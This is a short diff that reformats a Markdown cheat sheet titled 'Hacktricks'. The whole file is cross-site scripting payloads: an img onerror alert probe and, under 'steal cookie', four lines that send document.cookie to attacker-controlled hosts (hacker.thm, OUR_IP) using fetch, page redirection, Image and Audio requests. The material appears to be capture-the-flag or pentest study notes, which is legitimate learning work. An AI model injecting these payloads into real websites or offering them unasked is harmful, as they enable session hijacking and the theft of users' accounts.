@@ -1,12 +1,12 @@
-Hacktricks:
+### Hacktricks:
 
-<img src=x onerror=alert(PAYLOAD)>
+    <img src=x onerror=alert(PAYLOAD)>
 
-steal cookie:
-<script>fetch('http://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>
-document.location='http://OUR_IP/index.php?c='+document.cookie;
-new Image().src='http://OUR_IP/index.php?c='+document.cookie;
-new Audio().src='http://OUR_IP/index.php?c='+document.cookie;
+#### steal cookie:
+    <script>fetch('http://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>
+    document.location='http://OUR_IP/index.php?c='+document.cookie;
+    new Image().src='http://OUR_IP/index.php?c='+document.cookie;
+    new Audio().src='http://OUR_IP/index.php?c='+document.cookie;
 
 
 
